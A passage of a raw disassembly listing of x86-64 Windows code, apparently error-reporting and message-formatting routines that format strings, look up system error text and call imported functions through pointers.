   1400025ff:	4d 89 4b 20          	mov    %r9,0x20(%r11)
   140002603:	53                   	push   %rbx
   140002604:	57                   	push   %rdi
   140002605:	48 81 ec 48 0c 00 00 	sub    $0xc48,%rsp
   14000260c:	48 8b 05 2d ba 03 00 	mov    0x3ba2d(%rip),%rax        # 0x14003e040
   140002613:	48 33 c4             	xor    %rsp,%rax
   140002616:	48 89 84 24 30 0c 00 	mov    %rax,0xc30(%rsp)
   14000261d:	00 
   14000261e:	48 8b d9             	mov    %rcx,%rbx
   140002621:	49 8d 7b 10          	lea    0x10(%r11),%rdi
   140002625:	e8 16 ea ff ff       	call   0x140001040
   14000262a:	48 89 7c 24 28       	mov    %rdi,0x28(%rsp)
   14000262f:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   140002634:	4c 8b cb             	mov    %rbx,%r9
   140002637:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   14000263e:	00 00 
   140002640:	41 b8 00 04 00 00    	mov    $0x400,%r8d
   140002646:	48 8b 08             	mov    (%rax),%rcx
   140002649:	48 83 c9 02          	or     $0x2,%rcx
   14000264d:	e8 52 16 01 00       	call   0x140013ca4
   140002652:	41 b8 00 04 00 00    	mov    $0x400,%r8d
   140002658:	48 8d 94 24 30 04 00 	lea    0x430(%rsp),%rdx
   14000265f:	00 
   140002660:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140002665:	e8 46 60 00 00       	call   0x1400086b0
   14000266a:	33 c9                	xor    %ecx,%ecx
   14000266c:	41 b9 30 00 00 00    	mov    $0x30,%r9d
   140002672:	48 85 c0             	test   %rax,%rax
   140002675:	74 17                	je     0x14000268e
   140002677:	4c 8d 05 c2 95 02 00 	lea    0x295c2(%rip),%r8        # 0x14002bc40
   14000267e:	48 8d 94 24 30 04 00 	lea    0x430(%rsp),%rdx
   140002685:	00 
   140002686:	ff 15 3c 8d 02 00    	call   *0x28d3c(%rip)        # 0x14002b3c8
   14000268c:	eb 12                	jmp    0x1400026a0
   14000268e:	4c 8d 05 8b 95 02 00 	lea    0x2958b(%rip),%r8        # 0x14002bc20
   140002695:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   14000269a:	ff 15 30 8d 02 00    	call   *0x28d30(%rip)        # 0x14002b3d0
   1400026a0:	48 8b 8c 24 30 0c 00 	mov    0xc30(%rsp),%rcx
   1400026a7:	00 
   1400026a8:	48 33 cc             	xor    %rsp,%rcx
   1400026ab:	e8 c0 91 00 00       	call   0x14000b870
   1400026b0:	48 81 c4 48 0c 00 00 	add    $0xc48,%rsp
   1400026b7:	5f                   	pop    %rdi
   1400026b8:	5b                   	pop    %rbx
   1400026b9:	c3                   	ret
   1400026ba:	cc                   	int3
   1400026bb:	cc                   	int3
   1400026bc:	cc                   	int3
   1400026bd:	cc                   	int3
   1400026be:	cc                   	int3
   1400026bf:	cc                   	int3
   1400026c0:	4c 8b dc             	mov    %rsp,%r11
   1400026c3:	49 89 4b 08          	mov    %rcx,0x8(%r11)
   1400026c7:	49 89 53 10          	mov    %rdx,0x10(%r11)
   1400026cb:	4d 89 43 18          	mov    %r8,0x18(%r11)
   1400026cf:	4d 89 4b 20          	mov    %r9,0x20(%r11)
   1400026d3:	53                   	push   %rbx
   1400026d4:	57                   	push   %rdi
   1400026d5:	48 81 ec 48 08 00 00 	sub    $0x848,%rsp
   1400026dc:	48 8b 05 5d b9 03 00 	mov    0x3b95d(%rip),%rax        # 0x14003e040
   1400026e3:	48 33 c4             	xor    %rsp,%rax
   1400026e6:	48 89 84 24 30 08 00 	mov    %rax,0x830(%rsp)
   1400026ed:	00 
   1400026ee:	48 8b d9             	mov    %rcx,%rbx
   1400026f1:	49 8d 7b 10          	lea    0x10(%r11),%rdi
   1400026f5:	e8 46 e9 ff ff       	call   0x140001040
   1400026fa:	48 89 7c 24 28       	mov    %rdi,0x28(%rsp)
   1400026ff:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   140002704:	4c 8b cb             	mov    %rbx,%r9
   140002707:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   14000270e:	00 00 
   140002710:	41 b8 00 04 00 00    	mov    $0x400,%r8d
   140002716:	48 8b 08             	mov    (%rax),%rcx
   140002719:	48 83 c9 01          	or     $0x1,%rcx
   14000271d:	e8 d6 17 01 00       	call   0x140013ef8
   140002722:	41 b9 30 00 00 00    	mov    $0x30,%r9d
   140002728:	4c 8d 05 11 95 02 00 	lea    0x29511(%rip),%r8        # 0x14002bc40
   14000272f:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   140002734:	33 c9                	xor    %ecx,%ecx
   140002736:	ff 15 8c 8c 02 00    	call   *0x28c8c(%rip)        # 0x14002b3c8
   14000273c:	48 8b 8c 24 30 08 00 	mov    0x830(%rsp),%rcx
   140002743:	00 
   140002744:	48 33 cc             	xor    %rsp,%rcx
   140002747:	e8 24 91 00 00       	call   0x14000b870
   14000274c:	48 81 c4 48 08 00 00 	add    $0x848,%rsp
   140002753:	5f                   	pop    %rdi
   140002754:	5b                   	pop    %rbx
   140002755:	c3                   	ret
   140002756:	cc                   	int3
   140002757:	cc                   	int3
   140002758:	cc                   	int3
   140002759:	cc                   	int3
   14000275a:	cc                   	int3
   14000275b:	cc                   	int3
   14000275c:	cc                   	int3
   14000275d:	cc                   	int3
   14000275e:	cc                   	int3
   14000275f:	cc                   	int3
   140002760:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   140002765:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   14000276a:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   14000276f:	53                   	push   %rbx
   140002770:	56                   	push   %rsi
   140002771:	57                   	push   %rdi
   140002772:	b8 40 10 00 00       	mov    $0x1040,%eax
   140002777:	e8 f4 93 00 00       	call   0x14000bb70
   14000277c:	48 2b e0             	sub    %rax,%rsp
   14000277f:	48 8b 05 ba b8 03 00 	mov    0x3b8ba(%rip),%rax        # 0x14003e040
   140002786:	48 33 c4             	xor    %rsp,%rax
   140002789:	48 89 84 24 30 10 00 	mov    %rax,0x1030(%rsp)
   140002790:	00 
   140002791:	48 8b f9             	mov    %rcx,%rdi
   140002794:	e8 5b 1c 01 00       	call   0x1400143f4
   140002799:	48 8d b4 24 70 10 00 	lea    0x1070(%rsp),%rsi
   1400027a0:	00 
   1400027a1:	8b 18                	mov    (%rax),%ebx
   1400027a3:	e8 98 e8 ff ff       	call   0x140001040
   1400027a8:	4c 8b 8c 24 68 10 00 	mov    0x1068(%rsp),%r9
   1400027af:	00 
   1400027b0:	48 8d 94 24 30 04 00 	lea    0x430(%rsp),%rdx
   1400027b7:	00 
   1400027b8:	48 89 74 24 28       	mov    %rsi,0x28(%rsp)
   1400027bd:	41 b8 00 04 00 00    	mov    $0x400,%r8d
   1400027c3:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   1400027ca:	00 00 
   1400027cc:	48 8b 08             	mov    (%rax),%rcx
   1400027cf:	48 83 c9 02          	or     $0x2,%rcx
   1400027d3:	e8 cc 14 01 00       	call   0x140013ca4
   1400027d8:	8b cb                	mov    %ebx,%ecx
   1400027da:	e8 a1 1c 01 00       	call   0x140014480
   1400027df:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   1400027e4:	4c 8d 8c 24 30 04 00 	lea    0x430(%rsp),%r9
   1400027eb:	00 
   1400027ec:	4c 8d 05 6d 94 02 00 	lea    0x2946d(%rip),%r8        # 0x14002bc60
   1400027f3:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   1400027f8:	ba 00 04 00 00       	mov    $0x400,%edx
   1400027fd:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140002802:	e8 e9 f3 ff ff       	call   0x140001bf0
   140002807:	41 b8 00 04 00 00    	mov    $0x400,%r8d
   14000280d:	48 8d 94 24 30 08 00 	lea    0x830(%rsp),%rdx
   140002814:	00 
   140002815:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   14000281a:	e8 91 5e 00 00       	call   0x1400086b0
   14000281f:	33 c9                	xor    %ecx,%ecx
   140002821:	41 b9 30 00 00 00    	mov    $0x30,%r9d
   140002827:	48 85 c0             	test   %rax,%rax
   14000282a:	74 17                	je     0x140002843
   14000282c:	4c 8d 05 0d 94 02 00 	lea    0x2940d(%rip),%r8        # 0x14002bc40
   140002833:	48 8d 94 24 30 08 00 	lea    0x830(%rsp),%rdx
   14000283a:	00 
   14000283b:	ff 15 87 8b 02 00    	call   *0x28b87(%rip)        # 0x14002b3c8
   140002841:	eb 12                	jmp    0x140002855
   140002843:	4c 8d 05 d6 93 02 00 	lea    0x293d6(%rip),%r8        # 0x14002bc20
   14000284a:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   14000284f:	ff 15 7b 8b 02 00    	call   *0x28b7b(%rip)        # 0x14002b3d0
   140002855:	48 8b 8c 24 30 10 00 	mov    0x1030(%rsp),%rcx
   14000285c:	00 
   14000285d:	48 33 cc             	xor    %rsp,%rcx
   140002860:	e8 0b 90 00 00       	call   0x14000b870
   140002865:	48 81 c4 40 10 00 00 	add    $0x1040,%rsp
   14000286c:	5f                   	pop    %rdi
   14000286d:	5e                   	pop    %rsi
   14000286e:	5b                   	pop    %rbx
   14000286f:	c3                   	ret
   140002870:	4c 8b dc             	mov    %rsp,%r11
   140002873:	49 89 4b 08          	mov    %rcx,0x8(%r11)
   140002877:	49 89 53 10          	mov    %rdx,0x10(%r11)
   14000287b:	4d 89 43 18          	mov    %r8,0x18(%r11)
   14000287f:	4d 89 4b 20          	mov    %r9,0x20(%r11)
   140002883:	53                   	push   %rbx
   140002884:	57                   	push   %rdi
   140002885:	48 81 ec 48 0c 00 00 	sub    $0xc48,%rsp
   14000288c:	48 8b 05 ad b7 03 00 	mov    0x3b7ad(%rip),%rax        # 0x14003e040
   140002893:	48 33 c4             	xor    %rsp,%rax
   140002896:	48 89 84 24 30 0c 00 	mov    %rax,0xc30(%rsp)
   14000289d:	00 
   14000289e:	48 8b d9             	mov    %rcx,%rbx
   1400028a1:	49 8d 7b 10          	lea    0x10(%r11),%rdi
   1400028a5:	e8 96 e7 ff ff       	call   0x140001040
   1400028aa:	48 89 7c 24 28       	mov    %rdi,0x28(%rsp)
   1400028af:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   1400028b4:	4c 8b cb             	mov    %rbx,%r9
   1400028b7:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   1400028be:	00 00 
   1400028c0:	41 b8 00 04 00 00    	mov    $0x400,%r8d
   1400028c6:	48 8b 08             	mov    (%rax),%rcx
   1400028c9:	48 83 c9 02          	or     $0x2,%rcx
   1400028cd:	e8 d2 13 01 00       	call   0x140013ca4
   1400028d2:	41 b8 00 04 00 00    	mov    $0x400,%r8d
   1400028d8:	48 8d 94 24 30 04 00 	lea    0x430(%rsp),%rdx
   1400028df:	00 
   1400028e0:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   1400028e5:	e8 c6 5d 00 00       	call   0x1400086b0
   1400028ea:	33 c9                	xor    %ecx,%ecx
   1400028ec:	41 b9 30 00 00 00    	mov    $0x30,%r9d
   1400028f2:	48 85 c0             	test   %rax,%rax
   1400028f5:	74 17                	je     0x14000290e
   1400028f7:	4c 8d 05 52 93 02 00 	lea    0x29352(%rip),%r8        # 0x14002bc50
   1400028fe:	48 8d 94 24 30 04 00 	lea    0x430(%rsp),%rdx
   140002905:	00 
   140002906:	ff 15 bc 8a 02 00    	call   *0x28abc(%rip)        # 0x14002b3c8
   14000290c:	eb 12                	jmp    0x140002920
   14000290e:	4c 8d 05 0b 93 02 00 	lea    0x2930b(%rip),%r8        # 0x14002bc20
   140002915:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   14000291a:	ff 15 b0 8a 02 00    	call   *0x28ab0(%rip)        # 0x14002b3d0
   140002920:	48 8b 8c 24 30 0c 00 	mov    0xc30(%rsp),%rcx
   140002927:	00 
   140002928:	48 33 cc             	xor    %rsp,%rcx
   14000292b:	e8 40 8f 00 00       	call   0x14000b870
   140002930:	48 81 c4 48 0c 00 00 	add    $0xc48,%rsp
   140002937:	5f                   	pop    %rdi
   140002938:	5b                   	pop    %rbx
   140002939:	c3                   	ret
   14000293a:	cc                   	int3
   14000293b:	cc                   	int3
   14000293c:	cc                   	int3
   14000293d:	cc                   	int3
   14000293e:	cc                   	int3
   14000293f:	cc                   	int3
   140002940:	4c 8b dc             	mov    %rsp,%r11
   140002943:	49 89 4b 08          	mov    %rcx,0x8(%r11)
   140002947:	49 89 53 10          	mov    %rdx,0x10(%r11)
   14000294b:	4d 89 43 18          	mov    %r8,0x18(%r11)
   14000294f:	4d 89 4b 20          	mov    %r9,0x20(%r11)
   140002953:	53                   	push   %rbx
   140002954:	57                   	push   %rdi
   140002955:	48 81 ec 48 08 00 00 	sub    $0x848,%rsp
   14000295c:	48 8b 05 dd b6 03 00 	mov    0x3b6dd(%rip),%rax        # 0x14003e040
   140002963:	48 33 c4             	xor    %rsp,%rax
   140002966:	48 89 84 24 30 08 00 	mov    %rax,0x830(%rsp)
   14000296d:	00 
   14000296e:	48 8b d9             	mov    %rcx,%rbx
   140002971:	49 8d 7b 10          	lea    0x10(%r11),%rdi
   140002975:	e8 c6 e6 ff ff       	call   0x140001040
   14000297a:	48 89 7c 24 28       	mov    %rdi,0x28(%rsp)
   14000297f:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   140002984:	4c 8b cb             	mov    %rbx,%r9
   140002987:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   14000298e:	00 00 
   140002990:	41 b8 00 04 00 00    	mov    $0x400,%r8d
   140002996:	48 8b 08             	mov    (%rax),%rcx
   140002999:	48 83 c9 01          	or     $0x1,%rcx
   14000299d:	e8 56 15 01 00       	call   0x140013ef8
   1400029a2:	41 b9 30 00 00 00    	mov    $0x30,%r9d
   1400029a8:	4c 8d 05 a1 92 02 00 	lea    0x292a1(%rip),%r8        # 0x14002bc50
   1400029af:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   1400029b4:	33 c9                	xor    %ecx,%ecx
   1400029b6:	ff 15 0c 8a 02 00    	call   *0x28a0c(%rip)        # 0x14002b3c8
   1400029bc:	48 8b 8c 24 30 08 00 	mov    0x830(%rsp),%rcx
   1400029c3:	00 
   1400029c4:	48 33 cc             	xor    %rsp,%rcx
   1400029c7:	e8 a4 8e 00 00       	call   0x14000b870
   1400029cc:	48 81 c4 48 08 00 00 	add    $0x848,%rsp
   1400029d3:	5f                   	pop    %rdi
   1400029d4:	5b                   	pop    %rbx
   1400029d5:	c3                   	ret
   1400029d6:	cc                   	int3
   1400029d7:	cc                   	int3
   1400029d8:	cc                   	int3
   1400029d9:	cc                   	int3
   1400029da:	cc                   	int3
   1400029db:	cc                   	int3
   1400029dc:	cc                   	int3
   1400029dd:	cc                   	int3
   1400029de:	cc                   	int3
   1400029df:	cc                   	int3
   1400029e0:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   1400029e5:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   1400029ea:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   1400029ef:	53                   	push   %rbx
   1400029f0:	56                   	push   %rsi
   1400029f1:	57                   	push   %rdi
   1400029f2:	b8 50 10 00 00       	mov    $0x1050,%eax
   1400029f7:	e8 74 91 00 00       	call   0x14000bb70
   1400029fc:	48 2b e0             	sub    %rax,%rsp
   1400029ff:	48 8b 05 3a b6 03 00 	mov    0x3b63a(%rip),%rax        # 0x14003e040
   140002a06:	48 33 c4             	xor    %rsp,%rax
   140002a09:	48 89 84 24 40 10 00 	mov    %rax,0x1040(%rsp)
   140002a10:	00 
   140002a11:	48 8b f9             	mov    %rcx,%rdi
   140002a14:	ff 15 96 86 02 00    	call   *0x28696(%rip)        # 0x14002b0b0
   140002a1a:	8b d8                	mov    %eax,%ebx
   140002a1c:	48 8d b4 24 80 10 00 	lea    0x1080(%rsp),%rsi
   140002a23:	00 
   140002a24:	e8 17 e6 ff ff       	call   0x140001040
   140002a29:	4c 8b 8c 24 78 10 00 	mov    0x1078(%rsp),%r9
   140002a30:	00 
   140002a31:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   140002a36:	48 89 74 24 28       	mov    %rsi,0x28(%rsp)
   140002a3b:	41 b8 00 04 00 00    	mov    $0x400,%r8d
   140002a41:	33 f6                	xor    %esi,%esi
   140002a43:	48 8b 08             	mov    (%rax),%rcx
   140002a46:	48 83 c9 01          	or     $0x1,%rcx
   140002a4a:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140002a4f:	e8 a4 14 01 00       	call   0x140013ef8
   140002a54:	48 89 74 24 30       	mov    %rsi,0x30(%rsp)
   140002a59:	41 b9 00 04 00 00    	mov    $0x400,%r9d
   140002a5f:	48 8d 35 aa c2 03 00 	lea    0x3c2aa(%rip),%rsi        # 0x14003ed10
   140002a66:	c7 44 24 28 00 10 00 	movl   $0x1000,0x28(%rsp)
   140002a6d:	00 
   140002a6e:	44 8b c3             	mov    %ebx,%r8d
   140002a71:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140002a76:	33 d2                	xor    %edx,%edx
   140002a78:	b9 00 10 00 00       	mov    $0x1000,%ecx
   140002a7d:	ff 15 35 86 02 00    	call   *0x28635(%rip)        # 0x14002b0b8
   140002a83:	48 8d 0d 5e 91 02 00 	lea    0x2915e(%rip),%rcx        # 0x14002bbe8
   140002a8a:	ba 00 04 00 00       	mov    $0x400,%edx
   140002a8f:	85 c0                	test   %eax,%eax
   140002a91:	4c 8d 4c 24 40       	lea    0x40(%rsp),%r9
   140002a96:	4c 8d 05 d3 91 02 00 	lea    0x291d3(%rip),%r8        # 0x14002bc70
   140002a9d:	48 0f 45 ce          	cmovne %rsi,%rcx
   140002aa1:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   140002aa6:	48 8d 8c 24 40 08 00 	lea    0x840(%rsp),%rcx
   140002aad:	00 
   140002aae:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140002ab3:	e8 d8 fa ff ff       	call   0x140002590
   140002ab8:	41 b9 30 00 00 00    	mov    $0x30,%r9d
   140002abe:	4c 8d 05 7b 91 02 00 	lea    0x2917b(%rip),%r8        # 0x14002bc40
   140002ac5:	48 8d 94 24 40 08 00 	lea    0x840(%rsp),%rdx
   140002acc:	00 
   140002acd:	33 c9                	xor    %ecx,%ecx
   140002acf:	ff 15 f3 88 02 00    	call   *0x288f3(%rip)        # 0x14002b3c8
   140002ad5:	48 8b 8c 24 40 10 00 	mov    0x1040(%rsp),%rcx
   140002adc:	00 
   140002add:	48 33 cc             	xor    %rsp,%rcx
   140002ae0:	e8 8b 8d 00 00       	call   0x14000b870
   140002ae5:	48 81 c4 50 10 00 00 	add    $0x1050,%rsp
   140002aec:	5f                   	pop    %rdi
   140002aed:	5e                   	pop    %rsi
   140002aee:	5b                   	pop    %rbx
   140002aef:	c3                   	ret
   140002af0:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   140002af5:	56                   	push   %rsi
   140002af6:	57                   	push   %rdi
   140002af7:	41 55                	push   %r13
   140002af9:	41 56                	push   %r14
   140002afb:	41 57                	push   %r15
   140002afd:	48 83 ec 30          	sub    $0x30,%rsp
   140002b01:	48 8b 05 10 13 04 00 	mov    0x41310(%rip),%rax        # 0x140043e18
   140002b08:	4c 8b f9             	mov    %rcx,%r15
   140002b0b:	48 8d 0d 66 92 02 00 	lea    0x29266(%rip),%rcx        # 0x14002bd78
   140002b12:	41 8b f9             	mov    %r9d,%edi
   140002b15:	49 8b d8             	mov    %r8,%rbx
   140002b18:	48 8b f2             	mov    %rdx,%rsi
   140002b1b:	45 33 f6             	xor    %r14d,%r14d
   140002b1e:	ff 15 3c 89 02 00    	call   *0x2893c(%rip)        # 0x14002b460
   140002b24:	4c 8b e8             	mov    %rax,%r13
   140002b27:	48 85 c0             	test   %rax,%rax
   140002b2a:	0f 84 9c 01 00 00    	je     0x140002ccc
   140002b30:	48 8b c8             	mov    %rax,%rcx
   140002b33:	4c 89 64 24 68       	mov    %r12,0x68(%rsp)
   140002b38:	48 8b 05 11 13 04 00 	mov    0x41311(%rip),%rax        # 0x140043e50
   140002b3f:	48 8d 15 42 92 02 00 	lea    0x29242(%rip),%rdx        # 0x14002bd88
   140002b46:	ff 15 14 89 02 00    	call   *0x28914(%rip)        # 0x14002b460
   140002b4c:	4c 8b e0             	mov    %rax,%r12
   140002b4f:	48 85 c0             	test   %rax,%rax
   140002b52:	0f 84 5f 01 00 00    	je     0x140002cb7
   140002b58:	48 8b c8             	mov    %rax,%rcx
   140002b5b:	48 89 6c 24 60       	mov    %rbp,0x60(%rsp)
   140002b60:	48 8b 05 e1 12 04 00 	mov    0x412e1(%rip),%rax        # 0x140043e48
   140002b67:	4c 8b cb             	mov    %rbx,%r9
   140002b6a:	4c 8b c6             	mov    %rsi,%r8
   140002b6d:	4c 89 74 24 20       	mov    %r14,0x20(%rsp)
   140002b72:	49 8b d7             	mov    %r15,%rdx
   140002b75:	41 8b ee             	mov    %r14d,%ebp
   140002b78:	ff 15 e2 88 02 00    	call   *0x288e2(%rip)        # 0x14002b460
   140002b7e:	4c 8b f8             	mov    %rax,%r15
   140002b81:	48 85 c0             	test   %rax,%rax
   140002b84:	0f 84 08 01 00 00    	je     0x140002c92
   140002b8a:	85 ff                	test   %edi,%edi
   140002b8c:	75 18                	jne    0x140002ba6
   140002b8e:	48 8b c8             	mov    %rax,%rcx
   140002b91:	48 8b 05 c8 12 04 00 	mov    0x412c8(%rip),%rax        # 0x140043e60
   140002b98:	ff 15 c2 88 02 00    	call   *0x288c2(%rip)        # 0x14002b460
   140002b9e:	48 8b e8             	mov    %rax,%rbp
   140002ba1:	e9 c7 00 00 00       	jmp    0x140002c6d
   140002ba6:	48 8b 05 03 13 04 00 	mov    0x41303(%rip),%rax        # 0x140043eb0
   140002bad:	48 8d 0d e5 91 02 00 	lea    0x291e5(%rip),%rcx        # 0x14002bd99
   140002bb4:	ff 15 a6 88 02 00    	call   *0x288a6(%rip)        # 0x14002b460
   140002bba:	48 8b d8             	mov    %rax,%rbx
   140002bbd:	48 8b c8             	mov    %rax,%rcx
   140002bc0:	48 8b 05 f1 12 04 00 	mov    0x412f1(%rip),%rax        # 0x140043eb8
   140002bc7:	49 8b d7             	mov    %r15,%rdx
   140002bca:	ff 15 90 88 02 00    	call   *0x28890(%rip)        # 0x14002b460
   140002bd0:	48 8b e8             	mov    %rax,%rbp
   140002bd3:	48 8b cb             	mov    %rbx,%rcx
   140002bd6:	48 8b 05 8b 11 04 00 	mov    0x4118b(%rip),%rax        # 0x140043d68
   140002bdd:	ff 15 7d 88 02 00    	call   *0x2887d(%rip)        # 0x14002b460
   140002be3:	83 ff 02             	cmp    $0x2,%edi
   140002be6:	0f 85 81 00 00 00    	jne    0x140002c6d
   140002bec:	48 8b 05 bd 12 04 00 	mov    0x412bd(%rip),%rax        # 0x140043eb0
   140002bf3:	48 8d 0d a2 91 02 00 	lea    0x291a2(%rip),%rcx        # 0x14002bd9c
   140002bfa:	ff 15 60 88 02 00    	call   *0x28860(%rip)        # 0x14002b460
   140002c00:	48 8b f0             	mov    %rax,%rsi
   140002c03:	48 8d 0d 96 91 02 00 	lea    0x29196(%rip),%rcx        # 0x14002bda0
   140002c0a:	48 8b 05 9f 12 04 00 	mov    0x4129f(%rip),%rax        # 0x140043eb0
   140002c11:	ff 15 49 88 02 00    	call   *0x28849(%rip)        # 0x14002b460
   140002c17:	49 c7 c1 ff ff ff ff 	mov    $0xffffffffffffffff,%r9
   140002c1e:	48 8b d6             	mov    %rsi,%rdx
   140002c21:	48 8b f8             	mov    %rax,%rdi
   140002c24:	4c 8b c0             	mov    %rax,%r8
   140002c27:	48 8b 05 92 12 04 00 	mov    0x41292(%rip),%rax        # 0x140043ec0
   140002c2e:	48 8b cd             	mov    %rbp,%rcx
   140002c31:	ff 15 29 88 02 00    	call   *0x28829(%rip)        # 0x14002b460
   140002c37:	48 8b d8             	mov    %rax,%rbx
   140002c3a:	48 8b ce             	mov    %rsi,%rcx
   140002c3d:	48 8b 05 24 11 04 00 	mov    0x41124(%rip),%rax        # 0x140043d68
   140002c44:	ff 15 16 88 02 00    	call   *0x28816(%rip)        # 0x14002b460
   140002c4a:	48 8b 05 17 11 04 00 	mov    0x41117(%rip),%rax        # 0x140043d68
   140002c51:	48 8b cf             	mov    %rdi,%rcx
   140002c54:	ff 15 06 88 02 00    	call   *0x28806(%rip)        # 0x14002b460
   140002c5a:	48 8b 05 07 11 04 00 	mov    0x41107(%rip),%rax        # 0x140043d68
   140002c61:	48 8b cd             	mov    %rbp,%rcx
   140002c64:	ff 15 f6 87 02 00    	call   *0x287f6(%rip)        # 0x14002b460
   140002c6a:	48 8b eb             	mov    %rbx,%rbp
   140002c6d:	48 85 ed             	test   %rbp,%rbp
   140002c70:	74 20                	je     0x140002c92
   140002c72:	48 8b 05 17 12 04 00 	mov    0x41217(%rip),%rax        # 0x140043e90
   140002c79:	48 8b cd             	mov    %rbp,%rcx
   140002c7c:	ff 15 de 87 02 00    	call   *0x287de(%rip)        # 0x14002b460
   140002c82:	48 85 c0             	test   %rax,%rax
   140002c85:	74 0b                	je     0x140002c92
   140002c87:	48 8b c8             	mov    %rax,%rcx
   140002c8a:	e8 85 6a 01 00       	call   0x140019714
   140002c8f:	4c 8b f0             	mov    %rax,%r14
   140002c92:	48 8b 05 cf 10 04 00 	mov    0x410cf(%rip),%rax        # 0x140043d68
   140002c99:	49 8b cf             	mov    %r15,%rcx
   140002c9c:	ff 15 be 87 02 00    	call   *0x287be(%rip)        # 0x14002b460
   140002ca2:	48 8b 05 bf 10 04 00 	mov    0x410bf(%rip),%rax        # 0x140043d68
   140002ca9:	48 8b cd             	mov    %rbp,%rcx
   140002cac:	ff 15 ae 87 02 00    	call   *0x287ae(%rip)        # 0x14002b460
   140002cb2:	48 8b 6c 24 60       	mov    0x60(%rsp),%rbp
   140002cb7:	48 8b 05 aa 10 04 00 	mov    0x410aa(%rip),%rax        # 0x140043d68
   140002cbe:	49 8b cc             	mov    %r12,%rcx
   140002cc1:	ff 15 99 87 02 00    	call   *0x28799(%rip)        # 0x14002b460
   140002cc7:	4c 8b 64 24 68       	mov    0x68(%rsp),%r12
   140002ccc:	48 8b 05 95 10 04 00 	mov    0x41095(%rip),%rax        # 0x140043d68
   140002cd3:	49 8b cd             	mov    %r13,%rcx
   140002cd6:	ff 15 84 87 02 00    	call   *0x28784(%rip)        # 0x14002b460
   140002cdc:	48 8b 5c 24 70       	mov    0x70(%rsp),%rbx
   140002ce1:	49 8b c6             	mov    %r14,%rax
   140002ce4:	48 83 c4 30          	add    $0x30,%rsp
   140002ce8:	41 5f                	pop    %r15
   140002cea:	41 5e                	pop    %r14
   140002cec:	41 5d                	pop    %r13
   140002cee:	5f                   	pop    %rdi
   140002cef:	5e                   	pop    %rsi
   140002cf0:	c3                   	ret
   140002cf1:	cc                   	int3
   140002cf2:	cc                   	int3
   140002cf3:	cc                   	int3
   140002cf4:	cc                   	int3
   140002cf5:	cc                   	int3
   140002cf6:	cc                   	int3
   140002cf7:	cc                   	int3
   140002cf8:	cc                   	int3
   140002cf9:	cc                   	int3
   140002cfa:	cc                   	int3
   140002cfb:	cc                   	int3
   140002cfc:	cc                   	int3
   140002cfd:	cc                   	int3
   140002cfe:	cc                   	int3
   140002cff:	cc                   	int3
   140002d00:	40 56                	rex push %rsi
   140002d02:	41 55                	push   %r13
   140002d04:	41 57                	push   %r15
   140002d06:	b8 70 10 00 00       	mov    $0x1070,%eax
   140002d0b:	e8 60 8e 00 00       	call   0x14000bb70
   140002d10:	48 2b e0             	sub    %rax,%rsp
   140002d13:	48 8b 05 26 b3 03 00 	mov    0x3b326(%rip),%rax        # 0x14003e040
   140002d1a:	48 33 c4             	xor    %rsp,%rax
   140002d1d:	48 89 84 24 50 10 00 	mov    %rax,0x1050(%rsp)
   140002d24:	00 
   140002d25:	48 8b b1 10 20 00 00 	mov    0x2010(%rcx),%rsi
   140002d2c:	4c 8b e9             	mov    %rcx,%r13
   140002d2f:	48 8b 05 d2 10 04 00 	mov    0x410d2(%rip),%rax        # 0x140043e08
   140002d36:	48 8d 0d 6b 90 02 00 	lea    0x2906b(%rip),%rcx        # 0x14002bda8
   140002d3d:	ff 15 1d 87 02 00    	call   *0x2871d(%rip)        # 0x14002b460
   140002d43:	4c 8b f8             	mov    %rax,%r15
   140002d46:	48 85 c0             	test   %rax,%rax
   140002d49:	75 16                	jne    0x140002d61
   140002d4b:	48 8d 0d 66 90 02 00 	lea    0x29066(%rip),%rcx        # 0x14002bdb8
   140002d52:	e8 99 f8 ff ff       	call   0x1400025f0
   140002d57:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   140002d5c:	e9 a9 01 00 00       	jmp    0x140002f0a
   140002d61:	48 8b 05 d0 10 04 00 	mov    0x410d0(%rip),%rax        # 0x140043e38
   140002d68:	49 8b cf             	mov    %r15,%rcx
   140002d6b:	4c 89 a4 24 68 10 00 	mov    %r12,0x1068(%rsp)
   140002d72:	00 
   140002d73:	ff 15 e7 86 02 00    	call   *0x286e7(%rip)        # 0x14002b460
   140002d79:	4c 8b e0             	mov    %rax,%r12
   140002d7c:	48 85 c0             	test   %rax,%rax
   140002d7f:	75 16                	jne    0x140002d97
   140002d81:	48 8d 0d 50 90 02 00 	lea    0x29050(%rip),%rcx        # 0x14002bdd8
   140002d88:	e8 63 f8 ff ff       	call   0x1400025f0
   140002d8d:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
